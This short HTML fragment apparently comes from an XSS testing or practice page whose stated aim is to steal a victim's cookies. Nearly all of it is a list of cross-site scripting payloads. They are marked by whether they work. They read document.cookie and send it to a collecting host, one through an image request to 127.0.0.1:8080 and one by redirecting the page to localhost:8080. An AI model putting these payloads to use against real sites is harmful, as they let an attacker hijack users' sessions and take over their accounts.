<br><br>
<b>How to test?</b><br>
We are interested to steal victim's cookies. Here is the observation of our payloads.<br>

<textarea rows="12" cols="50">
Works fine - 
<script>document.write("cookie= "+document.cookie+">")</script>

Does not work - 
<script>document.write("<img src='http://127.0.0.1:8080?cookie='"+document.cookie+">")</script>


Steal cookies through this or Fetch API Javascript
<script>document.location='http://localhost:8080?cookie='+document.cookie</script>

</textarea>